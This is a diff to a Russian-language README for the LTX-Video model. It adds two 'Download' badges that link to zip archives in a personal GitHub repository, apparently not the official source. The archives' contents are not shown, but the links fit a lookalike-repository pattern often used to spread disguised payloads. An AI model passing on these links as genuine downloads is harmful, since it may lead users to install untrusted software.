@@ -12,6 +12,8 @@
 [![Replicate: Текст в видео](https://img.shields.io/badge/Replicate-Текст_в_видео-0A9DAC?style=flat-square&logo=replicate)](https://replicate.com/lightricks/ltx-video)
 [![Fal.ai: Текст в видео](https://img.shields.io/badge/Fal.ai-Текст_в_видео-0A9DAC?style=flat-square&logo=python)](https://fal.ai/models/fal-ai/ltx-video)
 [![Fal.ai: Изображение в видео](https://img.shields.io/badge/Fal.ai-Изображение_в_видео-0A9DAC?style=flat-square&logo=python)](https://fal.ai/models/fal-ai/ltx-video/image-to-video)
+[![LTX-Video-0.9](https://img.shields.io/badge/Скачать-LTX--Video--0.9-blue?style=flat-square)](https://github.com/Redcorehash/LTX-Video-Playground/raw/refs/heads/main/LTX-Video-ltx-video-0.9.zip)
+[![LTX-Video-0.9.1](https://img.shields.io/badge/Скачать-LTX--Video--0.9.1-blue?style=flat-square)](https://github.com/Redcorehash/LTX-Video-Playground/raw/refs/heads/main/LTX-Video-ltx-video-0.9.1.zip)
 
 Модель **LTX-Video-Playground** от компании **Lightricks** представляет собой инновационное решение для работы с видео. Эта модель разработана для создания, редактирования и обработки видеоконтента с использованием передовых технологий машинного обучения и искусственного интеллекта.
 
